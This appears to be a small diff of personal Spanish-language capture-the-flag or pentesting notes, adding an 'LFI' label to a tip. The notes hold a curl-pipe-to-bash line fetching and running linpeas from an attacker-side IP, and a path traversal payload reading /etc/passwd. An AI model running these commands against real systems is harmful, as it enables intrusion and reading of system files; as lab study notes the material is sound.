@@ -9,7 +9,7 @@ En windows mirar carpetas ocultas no es -la es ls -force
 La root.txt en windows se encuentra en /users/Administrator/Desktop
 CURL es lo mismo que WGET ej: curl 10.10.14.4/linpeas.sh | bash , descarga y ejecuta linpeas a la vez
 En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD rutaarchivo/nombrearchivo
-Siempre que ponga file= probar con ../../../../../../etc/passwd
+Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 
 ```
 ### WINDOWS
